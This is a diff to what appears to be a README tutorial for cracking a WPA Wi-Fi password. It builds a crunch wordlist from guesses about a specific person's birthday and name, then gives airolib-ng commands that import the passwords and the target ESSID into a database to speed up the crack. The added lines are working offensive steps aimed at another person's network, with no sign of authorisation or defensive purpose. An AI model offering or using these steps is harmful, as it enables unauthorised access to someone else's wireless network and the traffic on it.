@@ -52,6 +52,8 @@ crunch <min> <max> <charset> -t <pattern> -o password.txt
 
 i know the password is 8 numbers (i think it contains in his birthday) and 1 character (i think it contains in his name)
 
+it also a very very big file (11GB and 1,2 billion passwords)
+
 ![image](https://user-images.githubusercontent.com/90561566/166421946-28b579db-7fb3-4cee-b1a4-797bd3a7212a.png)
 
 now you can crack wpa with
@@ -67,6 +69,17 @@ but i will use database to speed up the attack
 
 install sqlite3 `sudo apt install sqlite3`
 
+create a file `essid.txt` this write name of target wifi
+
+![image](https://user-images.githubusercontent.com/90561566/166422433-22e160bf-31f9-4f9f-b512-ca67102d790f.png)
+
+```
+airolib-ng crackwpa --import passwd password.txt
+airolib-ng crackwpa --import essid essid.txt
+airolib-ng crackwpa --stats
+airolib-ng crackwpa --clean all
+airolib-ng crackwpa --batch
+```
 
 
 
